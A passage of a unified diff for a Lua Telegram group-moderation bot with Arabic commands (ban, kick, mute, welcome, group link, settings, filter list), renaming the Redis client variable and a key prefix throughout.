-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
 return "tshakke"
 end
@@ -5829,11 +5691,11 @@ local hash =  'MohaMeD:'..bot_id..'banned:'..msg.chat_id_
 if ck_mod(result.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد ( '..Rutba(result.sender_user_id_,result.chat_id_)..' )', 1, 'md')
 else
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"☑┇بالفعل تم حظره من المجموعه")
 chat_kick(result.chat_id_, result.sender_user_id_)
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"☑┇تم حظره من المجموعه")
 chat_kick(result.chat_id_, result.sender_user_id_)
 end
@@ -5844,7 +5706,7 @@ return false
 end
 
 if text and text:match("^حظر @(.*)$") then
-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
 return "tshakke"
 end
@@ -5858,7 +5720,7 @@ end
 if ck_mod(result.id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد ( '..Rutba(result.id_, msg.chat_id_)..' )', 1, 'md')
 else
-database:sadd('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'MohaMeDTEAM')..')\n☑┇تم حظره من المجموعه'
 chat_kick(msg.chat_id_, result.id_)
 end
@@ -5872,7 +5734,7 @@ return false
 end
 
 if text and text:match("^حظر (%d+)$") then
-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
 return "tshakke"
 end
@@ -5880,7 +5742,7 @@ local apba = {string.match(text, "^([Bb][Aa][Nn]) (%d+)$")}
 if ck_mod(apba[2], msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد ( '..Rutba(apba[2], msg.chat_id_)..' )', 1, 'md')
 else
-database:sadd('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
+datahmade:sadd('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
 chat_kick(msg.chat_id_, apba[2])  
 tsX000(apba[2],msg,"☑┇تم حظره من المجموعه")
 end
@@ -5891,8 +5753,8 @@ if text == ("رفع القيود") and msg.reply_to_message_id_ ~= 0 then
 function clear_all1(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'banned:'..msg.chat_id_
 local hash1 =  'MohaMeD:'..bot_id..'banned:'..msg.chat_id_
-database:del(hash, result.sender_user_id_)
-database:del(hash1, result.sender_user_id_)
+datahmade:del(hash, result.sender_user_id_)
+datahmade:del(hash1, result.sender_user_id_)
 tsX000("prore",msg,"☑┇تم تحريره من القيود")
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,clear_all1)
@@ -5906,8 +5768,8 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
-database:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
+datahmade:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
+datahmade:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'MohaMeDTEAM')..')\n☑┇تم تحريره من القيود'
 end
 send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
@@ -5917,8 +5779,8 @@ return false
 end
 if text and text:match("^رفع القيود (%d+)$") then
 local apba = {string.match(text, "^رفع القيود (%d+)$")}
-database:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
-database:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apba[2])
+datahmade:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
+datahmade:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apba[2])
 tsX000(apba[2],msg,"☑┇تم تحريره من القيود")
 return false
 end
@@ -5930,11 +5792,11 @@ send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md'
 return false 
 end
 local hash =  'MohaMeD:'..bot_id..'banned:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"☑┇بالفعل تم الغاء حظره من البوت")
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"☑┇تم الغاء حظره من البوت")
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 end
@@ -5945,7 +5807,7 @@ end
  
 if text and text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text and text:match("وضع رابط (https://t.me/joinchat/%S+)") then    
 local glink = text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text:match("وضع رابط (https://t.me/joinchat/%S+)") 
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,glink) 
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,glink) 
 send(msg.chat_id_, msg.id_, 1, '☑️┇تم وضع رابط', 1, 'md') 
 send(msg.chat_id_, 0, 1, '↙️┇رابط المجموعه الجديد\n'..glink, 1, 'html')
 end 
@@ -5959,7 +5821,7 @@ if tonumber(result.id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md') 
 return false 
 end
-database:srem('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, result.id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'MohaMeDTEAM')..')\n☑┇تم الغاء حظره من البوت' 
 else
@@ -5977,7 +5839,7 @@ if tonumber(apba[2]) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md') 
 return false 
 end
-database:srem('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
+datahmade:srem('MohaMeD:'..bot_id..'banned:'..msg.chat_id_, apba[2])
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = apba[2], status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 tsX000(apba[2],msg,"☑┇تم الغاء حظره من البوت") 
 return false
@@ -5989,10 +5851,10 @@ local hash =  'MohaMeD:'..bot_id..'muted:'..msg.chat_id_
 if ck_mod(result.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد او كتم ( '..Rutba(result.sender_user_id_,result.chat_id_)..' )', 1, 'md')
 else
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🚫┇بالفعل تم كتمه")
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"🚫┇تم كتمه من البوت ")
 end
 end
@@ -6011,7 +5873,7 @@ end
 if ck_mod(result.id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد او كتم ( '..Rutba(result.id_, msg.chat_id_)..' )', 1, 'md')
 else 
-database:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apsi[2] or 'MohaMeDTEAM')..')\n🚫┇تم كتمه من البوت'
 end
 else
@@ -6027,7 +5889,7 @@ local apsi = {string.match(text, "^(كتم) (%d+)$")}
 if ck_mod(apsi[2], msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد او كتم ( '..Rutba(apsi[2], msg.chat_id_)..' )', 1, 'md')
 else
-database:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
+datahmade:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
 tsX000(apsi[2],msg,"🚫┇تم كتمه من البوت")
 end
 return false
@@ -6035,10 +5897,10 @@ end
 if text == ("الغاء كتم") and msg.reply_to_message_id_ then
 function unmute_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'muted:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"📮┇بالفعل تم الغاء كتمه من البوت")
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"🚫┇تم الغاء كتمه من البوت")
 end
 end
@@ -6049,7 +5911,7 @@ if text and text:match("^الغاء كتم @(.*)$") then
 local apsi = {string.match(text, "^(الغاء كتم) @(.*)$")}
 function unmute_by_username(extra, result, success)
 if result.id_ then
-database:srem('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apsi[2] or 'MohaMeDTEAM')..')\n🚫┇تم الغاء كتمه من البوت'
 else
 texts = '✖┇خطاء'
@@ -6062,13 +5924,13 @@ end
 
 if text and text:match("^الغاء كتم (%d+)$") then
 local apsi = {string.match(text, "^(الغاء كتم) (%d+)$")}
-database:srem('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
+datahmade:srem('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
 tsX000(apsi[2],msg,"🚫┇تم الغاء كتمه من البوت")
 return false
 end
 
 if text == ("طرد") and msg.reply_to_message_id_ ~=0 then
-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
 return false
 end
@@ -6084,7 +5946,7 @@ getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
 return false
 end  
 if text and text:match("^طرد @(.*)$") then 
-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
 return "tshakke"
 end
@@ -6110,7 +5972,7 @@ resolve_username(apki[2],kick_by_username)
 return false
 end  
 if text and text:match("^طرد (%d+)$") then 
-if not is_creator(msg) and not is_setban(msg) and database:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
+if not is_creator(msg) and not is_setban(msg) and datahmade:get("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
 return "tshakke"
 end
@@ -6126,10 +5988,10 @@ end
 
 if text == ("الاعضاء المميزين") then
 local hash =   'MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "👥┇قائمة الاعضاء المميزين ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -6150,12 +6012,12 @@ end
 if text and text == "عدد الكروب" then 
 function dl_cb22( t1,t2 )
 local MohaMeD_098 = 0
-if database:get("MohaMeD:get:mod:"..bot_id..msg.chat_id_) then 
-t = database:get("MohaMeD:get:mod:"..bot_id..msg.chat_id_)
+if datahmade:get("MohaMeD:get:mod:"..bot_id..msg.chat_id_) then 
+t = datahmade:get("MohaMeD:get:mod:"..bot_id..msg.chat_id_)
 MohaMeD_098 = tonumber(t2.member_count_) - tonumber(t)
 end
 send(msg.chat_id_, msg.id_, 1, "🔖┇عدد المجموعه\n👤┇عدد المدراء : "..t2.administrator_count_.."\n👥┇عدد الاعضاء : "..t2.member_count_.." | ("..MohaMeD_098..")\n🔥┇عدد المطرودين : "..t2.kicked_count_, 1, 'md')
-database:set("MohaMeD:get:mod:"..bot_id..msg.chat_id_,t2.member_count_)   
+datahmade:set("MohaMeD:get:mod:"..bot_id..msg.chat_id_,t2.member_count_)   
 end
 tdcli_function ({
 ID = "GetChannelFull",
@@ -6164,10 +6026,10 @@ channel_id_ = getChatId(msg.chat_id_).ID
 end
 if text == ("المكتومين") then
 local hash =   'MohaMeD:'..bot_id..'muted:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "🚫┇قائمة المكتومين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -6187,10 +6049,10 @@ end
 
 if text == ("المحظورين") then
 local hash =   'MohaMeD:'..bot_id..'banned:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "⛔┇قائمة المحظورين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -6210,35 +6072,35 @@ end
 
 if text and text == "وضع رابط" then 
 send(msg.chat_id_, msg.id_, 1, '💥┇ارسال الان رابط المجموعه', 1, "md") 
-database:set("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
-return "keko"
+datahmade:set("ahmad:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
+return "ahmad"
 end
-if text and database:get("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_) and text:match("[Hh][Tt][Tt][pP]") then 
+if text and datahmade:get("ahmad:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_) and text:match("[Hh][Tt][Tt][pP]") then 
 send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع : ['..text..']', 1, 'md')
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,text)
-database:del("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
-return "keko"
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,text)
+datahmade:del("ahmad:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
+return "ahmad"
 end
 
 if text == ("تفعيل الترحيب") then
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل الترحيب في المجموعه', 1, 'md')
-database:set('MohaMeD:'..bot_id.."welcome"..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id.."welcome"..msg.chat_id_,true)
 end
 if text == ("تعطيل الترحيب") then
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل الترحيب في المجموعه', 1, 'md')
-database:del('MohaMeD:'..bot_id.."welcome"..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."welcome"..msg.chat_id_)
 end
 if text and text:match("^وضع ترحيب (.*)$") then
 local welcome = {string.match(text, "^(وضع ترحيب) (.*)$")}
 send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع ترحيب\n📜┇~⪼('..welcome[2]..')', 1, 'md')
-database:set('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_,welcome[2])
+datahmade:set('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_,welcome[2])
 end
 if text == ("حذف الترحيب") then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الترحيب', 1, 'md')
-database:del('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
 end
 if text == ("جلب الترحيب") then
-local wel = database:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
+local wel = datahmade:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
 if wel then
 send(msg.chat_id_, msg.id_, 1, '📜┇الترحيب\n~⪼('..wel..')', 1, 'md')
 else
@@ -6256,7 +6118,7 @@ local n = 0
 for k,v in pairs(list) do
 if v.user_id_ ~= bot_id then
 n = (n + 1)
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
@@ -6280,218 +6142,218 @@ end
 if (text and text:match("^(تعين عدد الاحرف) (%d+)$")) then
 MohaMeD_0 = {string.match(text, "^(تعين عدد الاحرف) (%d+)$")}
 send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين عدد الاحرف {`'..MohaMeD_0[2]..'`}', 1, 'md')
-database:set("MohaMeD:not:word:"..bot_id..msg.chat_id_,MohaMeD_0[2])
+datahmade:set("MohaMeD:not:word:"..bot_id..msg.chat_id_,MohaMeD_0[2])
 end
 
 if text == ("الاعدادات") then
-if database:get("lock_media:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_media:MohaMeD"..msg.chat_id_..bot_id) then
 mute_all = '✔┇'
 else
 mute_all = '✖┇'
 end
 ------------
-if database:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id) then
 mute_text = '✔┇'
 else
 mute_text = '✖┇'
 end
 ------------
-if database:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id) then
 mute_photo = '✔┇'
 else
 mute_photo = '✖┇'
 end
 ------------
-if database:get("lock_video:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_video:MohaMeD"..msg.chat_id_..bot_id) then
 mute_video = '✔┇'
 else
 mute_video = '✖┇'
 end
-if database:get("lock_note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_note:MohaMeD"..msg.chat_id_..bot_id) then
 mute_note = '✔┇'
 else
 mute_note = '✖┇'
 end
 ------------
-if database:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id) then
 mute_gifs = '✔┇'
 else
 mute_gifs = '✖┇'
 end
 ------------
-if not database:get('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_) then
 flood_m = 10
 else
-flood_m = database:get('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_)
+flood_m = datahmade:get('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_)
 end
-if not database:get( 'MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_) then
+if not datahmade:get( 'MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_) then
 flood_t = 10
 else
-flood_t = database:get( 'MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_)
+flood_t = datahmade:get( 'MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_)
 end
 ------------
-if database:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id) then
 mute_music = '✔┇'
 else
 mute_music = '✖┇'
 end
 ------------
-if database:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id) then
 mute_bots = '✔┇'
 else
 mute_bots = '✖┇'
 end
 
-if database:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) then
 mute_botsb = '✔┇'
 else
 mute_botsb = '✖┇'
 end
-if database:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id) then
 mute_flood = '✔┇'
 else
 mute_flood = '✖┇'
 end
 ------------
-if database:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id) then
 mute_in = '✔┇'
 else
 mute_in = '✖┇'
 end
 ------------
-if database:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id) then
 mute_voice = '✔┇'
 else
 mute_voice = '✖┇'
 end
 ------------
-if database:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id) then
 mute_edit = '✔┇'
 else
 mute_edit = '✖┇'
 end
 ------------
-if database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
 mute_links = '✔┇'
 else
 mute_links = '✖┇'
 end
 ------------
-if database:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id) then
 lock_pin = '✔┇'
 else
 lock_pin = '✖┇'
 end
 
-if database:get("lock_files:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_files:MohaMeD"..msg.chat_id_..bot_id) then
 mute_doc = '✔┇'
 else
 mute_doc = '✖┇'
 end
 
-if database:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id) then
 mute_mdd = '✔┇'
 else
 mute_mdd = '✖┇'
 end
 ------------
-if database:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id) then
 lock_sticker = '✔┇'
 else
 lock_sticker = '✖┇'
 end
 ------------
-if database:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
 lock_tgservice = '✔┇'
 else
 lock_tgservice = '✖┇'
 end
 ------------
-if database:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
 lock_htag = '✔┇'
 else
 lock_htag = '✖┇'
 end
 
-if database:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
 lock_cmd = '✔┇'
 else
 lock_cmd = '✖┇'
 end
 ------------
-if database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
 lock_tag = '✔┇'
 else
 lock_tag = '✖┇'
 end
 ------------
-if database:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id) then
 lock_contact = '✔┇'
 else
 lock_contact = '✖┇'
 end
 ------------
-if database:get("lock_en:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_en:MohaMeD"..msg.chat_id_..bot_id) then
 lock_english = '✔┇'
 else
 lock_english = '✖┇'
 end
 ------------
-if database:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id) then
 lock_arabic = '✔┇'
 else
 lock_arabic = '✖┇'
 end
 ------------
-if database:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id) then
 lock_forward = '✔┇'
 else
 lock_forward = '✖┇'
 end
 
-if database:get('MohaMeD:'..bot_id..'rep:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'rep:mute'..msg.chat_id_) then
 lock_rep = '✔┇'
 else
 lock_rep = '✖┇'
 end
 ------------
-if database:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
 lock_repsudo = '✔┇'
 else
 lock_repsudo = '✖┇'
 end
 ------------
-if database:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
 lock_repowner = '✔┇'
 else
 lock_repowner = '✖┇'
 end
 ------------
-if database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
 lock_id = '✔┇'
 else
 lock_id = '✖┇'
 end
 ------------
-if database:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'pin:mute'..msg.chat_id_) then
 lock_pind = '✔┇'
 else
 lock_pind = '✖┇'
 end
 ------------
-if database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
 lock_id_photo = '✔┇'
 else
 lock_id_photo = '✖┇'
 end
 ------------
-if database:get( 'MohaMeD:'..bot_id.."welcome"..msg.chat_id_) then
+if datahmade:get( 'MohaMeD:'..bot_id.."welcome"..msg.chat_id_) then
 send_welcome = '✔┇'
 else
 send_welcome = '✖┇'
 end
 ------------
-local ex = database:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+local ex = datahmade:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
 if ex == -1 then
 exp_dat = 'لا نهائي'
 else
@@ -6539,20 +6401,20 @@ send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
 end
 
 if text == "مسح قائمه المنع" then  
-local list = database:smembers('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_)  
+local list = datahmade:smembers('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_)  
 for k,v in pairs(list) do  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..v..msg.chat_id_)  
-database:srem('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,v)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..v..msg.chat_id_)  
+datahmade:srem('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,v)  
 end  
 send(msg.chat_id_, msg.id_, 1, "🔖┇ تم مسح قائمه المنع بنجاح \n", 1, 'md')  
 end
 
 if text == "قائمه المنع" then  
-local list = database:smembers('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_)  
+local list = datahmade:smembers('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_)  
 t = "⚠┇قائمة الكلمات الممنوعه ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do  
-local taha = database:get('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..v..msg.chat_id_)   
